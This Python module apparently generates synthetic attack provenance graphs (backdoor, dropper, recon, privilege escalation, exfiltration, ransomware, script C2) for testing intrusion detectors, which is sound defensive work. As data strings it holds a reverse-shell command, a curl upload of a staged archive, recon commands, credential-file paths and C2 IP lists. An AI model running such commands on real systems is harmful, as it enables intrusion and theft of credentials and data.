"""Synthetic attack families as provenance subgraphs.

An AttackGraph is a small set of new entities plus a time-ordered list of flow-oriented events, expressed with
placeholder uuids for the existing entities it attaches to ("$host", "$shell", ...). Times are offsets in
nanoseconds from the attack start; the injector binds placeholders, assigns fresh uuids and absolute times.
"""
from __future__ import annotations

import hashlib
import random
from dataclasses import dataclass, field

from pdp_engine.schema import REVERSED, Entity

S = 1_000_000_000  # ns per second


@dataclass
class AttackGraph:
    family: str
    entities: dict[str, Entity] = field(default_factory=dict)      # new entities keyed by local uuid
    events: list[tuple[int, str, str, str]] = field(default_factory=list)   # (t_offset_ns, src, op, dst) flow-oriented
    malicious: set[str] = field(default_factory=set)              # local uuids / placeholders counted as attack nodes
    roles: dict[str, str] = field(default_factory=dict)            # placeholder -> role used to pick a real host node
    params: dict = field(default_factory=dict)

    # ---- builders -----------------------------------------------------------------------------
    def _uid(self, kind: str) -> str:
        return f"${kind}:{len(self.entities)}"

    def process(self, exe: str, cmd: str, malicious: bool = True, **display) -> str:
        if _CTX is not None:
            exe, cmd = _CTX.proc(exe, cmd)
        u = self._uid("p"); self.entities[u] = Entity.process(u, exe, cmd, **display)
        if malicious:
            self.malicious.add(u)
        return u

    def file(self, path: str, malicious: bool = True, **display) -> str:
        u = self._uid("f"); self.entities[u] = Entity.file(u, path, **display)
        if malicious:
            self.malicious.add(u)
        return u

    def socket(self, ip: str, port: int | str, malicious: bool = True, **display) -> str:
        u = self._uid("n"); self.entities[u] = Entity.socket(u, ip, port, **display)
        if malicious:
            self.malicious.add(u)
        return u

    def placeholder(self, name: str, role: str, malicious: bool = True) -> str:
        u = f"${name}"; self.roles[u] = role
        if malicious:
            self.malicious.add(u)
        return u

    def kernel(self, t: int, subject: str, op: str, obj: str) -> None:
        """Record `subject performs op on obj` at offset t, in data-flow orientation."""
        if op in REVERSED:
            self.events.append((t, obj, op, subject))
        else:
            self.events.append((t, subject, op, obj))

    @property
    def duration_ns(self) -> int:
        return max((e[0] for e in self.events), default=0)


# ---- vocabulary -------------------------------------------------------------------------------------
C2_IPS = ["45.33.32.156", "185.220.101.34", "91.219.236.24", "23.129.64.187", "198.51.100.23", "203.0.113.77", "80.82.77.139", "5.188.206.14"]
INTERNAL_IPS = ["10.0.4.12", "10.0.4.31", "192.168.1.77", "172.16.8.9"]
DROP_DIRS = ["/tmp", "/var/tmp", "/dev/shm", "/tmp/.X11-unix", "/var/tmp/.cache"]
DROP_NAMES = ["vUgefal", "XIM", "main", "loaderx", ".sh", "pEja72mA", "x86_64", "ztmp", "update.bin", "libk.so"]
SENSITIVE = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/hosts", "/etc/ssh/sshd_config", "/root/.bash_history", "/root/.ssh/id_rsa", "/etc/crontab", "/proc/net/tcp"]
RECON = [("/usr/bin/whoami", "whoami"), ("/usr/bin/id", "id"), ("/usr/bin/uname", "uname -a"), ("/usr/bin/netstat", "netstat -antp"),
         ("/bin/ps", "ps aux"), ("/usr/bin/find", "find / -perm -4000"), ("/bin/cat", "cat /etc/passwd"), ("/sbin/ifconfig", "ifconfig -a"),
         ("/usr/bin/w", "w"), ("/bin/ls", "ls -la /root")]


class Ctx:
    """Benign context sampled from the target endpoint (used by attack generators and camouflage).

    `exe_none` tells whether the endpoint's process labels carry an executable path (auditd, THEIA) or only a
    command name (CADETS records 'None <name>'); synthetic processes follow the same style so that they are not
    trivially distinguishable by label format."""

    def __init__(self, rng: random.Random, process_labels: list[str], file_paths: list[str], ips: list[str], exe_none: bool = False,
                 proc_files: dict[str, list[str]] | None = None):
        self.rng, self.process_labels, self.file_paths, self.ips, self.exe_none = rng, process_labels, file_paths, ips, exe_none
        self.proc_files = proc_files or {}      # benign process label -> file paths it touches in the baseline

    def files_like(self, label: str, n: int) -> list[str]:
        """Files a benign process with this label uses (mimicry); falls back to the busiest benign processes' files."""
        cand = self.proc_files.get(label)
        if not cand:
            pool = [f for lab in self.process_labels[:20] for f in self.proc_files.get(lab, [])]
            cand = pool or self.file_paths
        return [self.rng.choice(cand) for _ in range(n)] if cand else []

    def proc(self, exe: str, cmd: str) -> tuple[str, str]:
        if self.exe_none:
            return "None", (cmd.split()[0].rsplit("/", 1)[-1] if cmd else exe.rsplit("/", 1)[-1])
        return exe, cmd

    def user_files(self, n: int) -> list[str]:
        cand = [p for p in self.file_paths if p.startswith(("/home", "/root", "/var/www", "/srv", "/usr/share", "/opt")) and not p.endswith("/")] or self.file_paths
        return [self.rng.choice(cand) for _ in range(n)] if cand else [f"/home/user/doc{i}.txt" for i in range(n)]


def _drop(rng: random.Random) -> str:
    return f"{rng.choice(DROP_DIRS)}/{rng.choice(DROP_NAMES)}"


# ---- families ---------------------------------------------------------------------------------------
def web_backdoor(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """DARPA E3 CADETS Nginx backdoor: a web server receives a crafted request, drops an implant, executes it,
    the implant beacons to C2, performs recon and fetches a second stage."""
    g = AttackGraph("web_backdoor")
    host = g.placeholder("host", "web")
    c2 = rng.choice(C2_IPS)
    inbound = g.socket(c2, rng.randint(30000, 60000))
    drop = g.file(_drop(rng))
    t = 0
    g.kernel(t, host, "RECVFROM", inbound); t += int(0.2 * S)
    g.kernel(t, host, "OPEN", drop); g.kernel(t + 1000, host, "WRITE", drop); t += int(0.5 * S)
    g.kernel(t, host, "SENDTO", inbound); t += int(1.5 * S)
    dp = g.entities[drop].label.split(" ", 1)[1]
    impl = g.process(dp, dp)
    g.kernel(t, host, "CLONE", impl); t += int(0.05 * S)
    g.kernel(t, impl, "EXECUTE", drop); t += int(0.3 * S)
    beacon = g.socket(c2, rng.choice([80, 443, 8080, 4444]))
    g.kernel(t, impl, "CONNECT", beacon); t += int(0.4 * S)
    g.kernel(t, impl, "SENDTO", beacon); g.kernel(t + int(0.3 * S), impl, "RECVFROM", beacon); t += int(2 * S)
    for p in rng.sample(SENSITIVE, 3):
        f = g.file(p, malicious=False)
        g.kernel(t, impl, "OPEN", f); g.kernel(t + 2000, impl, "READ", f); t += int(rng.uniform(0.2, 1.5) * S)
    g.kernel(t, impl, "SENDTO", beacon); t += int(rng.uniform(5, 30) * S)
    stage2 = g.file(_drop(rng))
    g.kernel(t, impl, "RECVFROM", beacon); g.kernel(t + 5000, impl, "OPEN", stage2); g.kernel(t + 9000, impl, "WRITE", stage2); t += int(1 * S)
    child = g.process(g.entities[stage2].label.split(" ", 1)[1], g.entities[stage2].label.split(" ", 1)[1] + " -c 1")
    g.kernel(t, impl, "CLONE", child); g.kernel(t + 30000, child, "EXECUTE", stage2); t += int(0.5 * S)
    g.kernel(t, child, "CONNECT", beacon); g.kernel(t + int(0.2 * S), child, "SENDTO", beacon)
    return g


def browser_dropper(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """DARPA E3 THEIA browser-extension / Firefox backdoor: the browser writes a native-messaging dropper that
    runs, downloads an elevated implant and injects / executes it."""
    g = AttackGraph("browser_dropper")
    host = g.placeholder("host", "browser")
    c2 = rng.choice(C2_IPS)
    web = g.socket(c2, 80)
    t = 0
    g.kernel(t, host, "CONNECT", web); g.kernel(t + int(0.3 * S), host, "RECVFROM", web); t += int(1 * S)
    dropper = g.file(rng.choice(["/etc/firefox/native-messaging-hosts/gtcache", "/home/admin/.cache/mozilla/firefox/profile/pass_mgr", "/home/admin/.mozilla/native-messaging-hosts/clean"]))
    g.kernel(t, host, "OPEN", dropper); g.kernel(t + 5000, host, "WRITE", dropper); t += int(2 * S)
    p1 = g.process(g.entities[dropper].label.split(" ", 1)[1], "./" + g.entities[dropper].label.rsplit("/", 1)[-1])
    g.kernel(t, host, "CLONE", p1); g.kernel(t + 20000, p1, "EXECUTE", dropper); t += int(0.5 * S)
    c2s = g.socket(c2, rng.choice([443, 8000, 1337]))
    g.kernel(t, p1, "CONNECT", c2s); g.kernel(t + int(0.2 * S), p1, "SENDTO", c2s); g.kernel(t + int(0.6 * S), p1, "RECVFROM", c2s); t += int(3 * S)
    implant = g.file(_drop(rng))
    g.kernel(t, p1, "OPEN", implant); g.kernel(t + 3000, p1, "WRITE", implant); t += int(1 * S)
    for _ in range(rng.randint(2, 5)):   # memory-resident stage: repeated clone/exec of helper copies
        p2 = g.process(g.entities[implant].label.split(" ", 1)[1], g.entities[implant].label.split(" ", 1)[1])
        g.kernel(t, p1, "CLONE", p2); g.kernel(t + 15000, p2, "EXECUTE", implant); t += int(rng.uniform(0.5, 4) * S)
        g.kernel(t, p2, "CONNECT", c2s); g.kernel(t + int(0.1 * S), p2, "SENDTO", c2s); t += int(rng.uniform(1, 10) * S)
    sens = g.file("/etc/passwd", malicious=False)
    g.kernel(t, p1, "OPEN", sens); g.kernel(t + 1000, p1, "READ", sens); g.kernel(t + int(0.5 * S), p1, "SENDTO", c2s)
    return g


def lotl_recon(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """Living off the land: an interactive shell under a compromised process runs system utilities for
    discovery, stages the output in a temp file and sends it out."""
    g = AttackGraph("lotl_recon")
    host = g.placeholder("host", "any")
    sh = g.process("/bin/sh", "sh -i")
    t = 0
    g.kernel(t, host, "CLONE", sh); t += int(0.3 * S)
    out = g.file(f"/tmp/.{rng.choice(['out', 'log', 'x', 'rec'])}{rng.randint(1, 999)}")
    for exe, cmd in rng.sample(RECON, rng.randint(4, 8)):
        p = g.process(exe, cmd)
        binf = g.file(exe, malicious=False)
        g.kernel(t, sh, "CLONE", p); g.kernel(t + 10000, p, "EXECUTE", binf); t += int(0.05 * S)
        if "cat" in cmd or "find" in cmd:
            f = g.file(cmd.split()[-1] if cmd.startswith("cat") else "/etc/passwd", malicious=False)
            g.kernel(t, p, "OPEN", f); g.kernel(t + 2000, p, "READ", f)
        g.kernel(t + int(0.1 * S), p, "OPEN", out); g.kernel(t + int(0.12 * S), p, "WRITE", out); t += int(rng.uniform(0.5, 6) * S)
    sock = g.socket(rng.choice(C2_IPS), rng.choice([443, 53, 8443]))
    g.kernel(t, sh, "OPEN", out); g.kernel(t + 2000, sh, "READ", out); g.kernel(t + int(0.2 * S), sh, "CONNECT", sock); g.kernel(t + int(0.4 * S), sh, "SENDTO", sock)
    return g


def priv_esc_lateral(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """Privilege escalation then lateral movement: credential files are read, persistence written (cron, ssh
    keys), a setuid helper executed and an SSH / SMB connection opened to an internal host."""
    g = AttackGraph("priv_esc_lateral")
    host = g.placeholder("host", "shell")
    t = 0
    for p in ["/etc/sudoers", "/etc/shadow", "/etc/passwd"]:
        f = g.file(p, malicious=False)
        g.kernel(t, host, "OPEN", f); g.kernel(t + 1500, host, "READ", f); t += int(rng.uniform(0.3, 2) * S)
    helper = g.file(rng.choice(["/usr/bin/pkexec", "/usr/bin/sudo", "/bin/su", "/usr/bin/passwd"]), malicious=False)
    su = g.process(g.entities[helper].label.split(" ", 1)[1], g.entities[helper].label.split(" ", 1)[1] + " -")
    g.kernel(t, host, "CLONE", su); g.kernel(t + 20000, su, "EXECUTE", helper); t += int(0.4 * S)
    rootsh = g.process("/bin/bash", "bash")
    g.kernel(t, su, "CLONE", rootsh); t += int(0.5 * S)
    for p in ["/etc/crontab", "/root/.ssh/authorized_keys", "/etc/ld.so.preload"][: rng.randint(1, 3)]:
        f = g.file(p)
        g.kernel(t, rootsh, "OPEN", f); g.kernel(t + 2000, rootsh, "WRITE", f); t += int(rng.uniform(0.5, 3) * S)
    key = g.file("/root/.ssh/id_rsa", malicious=False)
    g.kernel(t, rootsh, "OPEN", key); g.kernel(t + 1000, rootsh, "READ", key); t += int(1 * S)
    ssh = g.process("/usr/bin/ssh", f"ssh root@{rng.choice(INTERNAL_IPS)}")
    g.kernel(t, rootsh, "CLONE", ssh); g.kernel(t + 15000, ssh, "EXECUTE", g.file("/usr/bin/ssh", malicious=False)); t += int(0.3 * S)
    lat = g.socket(rng.choice(INTERNAL_IPS), rng.choice([22, 445, 3389, 5985]))
    g.kernel(t, ssh, "CONNECT", lat); g.kernel(t + int(0.2 * S), ssh, "SENDTO", lat); g.kernel(t + int(0.6 * S), ssh, "RECVFROM", lat); t += int(2 * S)
    for _ in range(rng.randint(3, 10)):
        g.kernel(t, ssh, "SENDTO", lat); t += int(rng.uniform(0.2, 2) * S)
    return g


def exfiltration(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """Data exfiltration: a process reads many user documents, compresses them into an archive and uploads it."""
    g = AttackGraph("exfiltration")
    host = g.placeholder("host", "any")
    n = rng.randint(20, 80)
    tar = g.process("/bin/tar", "tar czf /tmp/.a.tgz")
    t = 0
    g.kernel(t, host, "CLONE", tar); g.kernel(t + 10000, tar, "EXECUTE", g.file("/bin/tar", malicious=False)); t += int(0.2 * S)
    arch = g.file(f"/tmp/.{rng.choice(['a', 'b', 'data', 'bk'])}.tgz")
    g.kernel(t, tar, "OPEN", arch)
    for p in ctx.user_files(n):
        f = g.file(p, malicious=False)
        g.kernel(t, tar, "OPEN", f); g.kernel(t + 500, tar, "READ", f); g.kernel(t + 900, tar, "WRITE", arch); t += int(rng.uniform(0.01, 0.3) * S)
    up = g.process(rng.choice(["/usr/bin/curl", "/usr/bin/wget", "/usr/bin/python"]), "curl -T /tmp/.a.tgz")
    g.kernel(t, host, "CLONE", up); g.kernel(t + 10000, up, "EXECUTE", g.file(g.entities[up].label.split()[1], malicious=False)); t += int(0.3 * S)
    out = g.socket(rng.choice(C2_IPS), rng.choice([443, 80, 21, 8443]))
    g.kernel(t, up, "OPEN", arch); g.kernel(t + 1000, up, "READ", arch); g.kernel(t + int(0.1 * S), up, "CONNECT", out)
    for _ in range(rng.randint(10, 40)):
        t += int(rng.uniform(0.05, 0.5) * S); g.kernel(t, up, "SENDTO", out)
    g.kernel(t + int(0.5 * S), up, "RECVFROM", out)
    return g


def ransomware(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """Ransomware: a dropped binary enumerates user files, rewrites each one and drops ransom notes, then
    reports the key to its C2."""
    g = AttackGraph("ransomware")
    host = g.placeholder("host", "any")
    drop = g.file(_drop(rng))
    t = 0
    g.kernel(t, host, "OPEN", drop); g.kernel(t + 2000, host, "WRITE", drop); t += int(0.5 * S)
    enc = g.process(g.entities[drop].label.split(" ", 1)[1], g.entities[drop].label.split(" ", 1)[1] + " --silent")
    g.kernel(t, host, "CLONE", enc); g.kernel(t + 15000, enc, "EXECUTE", drop); t += int(0.3 * S)
    c2 = g.socket(rng.choice(C2_IPS), rng.choice([443, 4433, 9001]))
    g.kernel(t, enc, "CONNECT", c2); g.kernel(t + int(0.2 * S), enc, "SENDTO", c2); g.kernel(t + int(0.5 * S), enc, "RECVFROM", c2); t += int(1 * S)
    dirs = set()
    for p in ctx.user_files(rng.randint(30, 120)):
        f = g.file(p, malicious=False)
        g.kernel(t, enc, "OPEN", f); g.kernel(t + 300, enc, "READ", f); g.kernel(t + 800, enc, "WRITE", f); t += int(rng.uniform(0.005, 0.1) * S)
        d = p.rsplit("/", 1)[0]
        if d not in dirs and len(dirs) < 8:
            dirs.add(d)
            note = g.file(f"{d}/README_TO_DECRYPT.txt")
            g.kernel(t, enc, "OPEN", note); g.kernel(t + 400, enc, "WRITE", note)
    g.kernel(t + int(0.5 * S), enc, "SENDTO", c2)
    return g


def script_c2(rng: random.Random, ctx: Ctx) -> AttackGraph:
    """OpTC-style scripted implant: an interpreter fetches and runs a payload from the network, keeps a
    beacon loop with jitter and spawns helper commands on request."""
    g = AttackGraph("script_c2")
    host = g.placeholder("host", "any")
    interp = rng.choice([("/usr/bin/python", "python -c import socket,os"), ("/usr/bin/perl", "perl -e use Socket"), ("/bin/bash", "bash -i >& /dev/tcp/x/4444 0>&1")])
    p = g.process(*interp)
    t = 0
    g.kernel(t, host, "CLONE", p); g.kernel(t + 10000, p, "EXECUTE", g.file(interp[0], malicious=False)); t += int(0.3 * S)
    c2 = g.socket(rng.choice(C2_IPS), rng.choice([4444, 443, 53, 1080]))
    g.kernel(t, p, "CONNECT", c2); t += int(0.2 * S)
    for _ in range(rng.randint(6, 20)):
        g.kernel(t, p, "RECVFROM", c2); t += int(0.05 * S)
        if rng.random() < 0.4:
            exe, cmd = rng.choice(RECON)
            h = g.process(exe, cmd)
            g.kernel(t, p, "CLONE", h); g.kernel(t + 8000, h, "EXECUTE", g.file(exe, malicious=False)); t += int(0.2 * S)
            g.kernel(t, h, "SENDTO", c2)
        g.kernel(t + int(0.1 * S), p, "SENDTO", c2); t += int(rng.uniform(2, 20) * S)
    return g


FAMILIES = {"web_backdoor": web_backdoor, "browser_dropper": browser_dropper, "lotl_recon": lotl_recon, "priv_esc_lateral": priv_esc_lateral,
            "exfiltration": exfiltration, "ransomware": ransomware, "script_c2": script_c2}


_CTX: "Ctx | None" = None   # label style of the endpoint being simulated, set during generate()


def generate(family: str, rng: random.Random, ctx: Ctx) -> AttackGraph:
    global _CTX
    _CTX = ctx
    try:
        return FAMILIES[family](rng, ctx)
    finally:
        _CTX = None
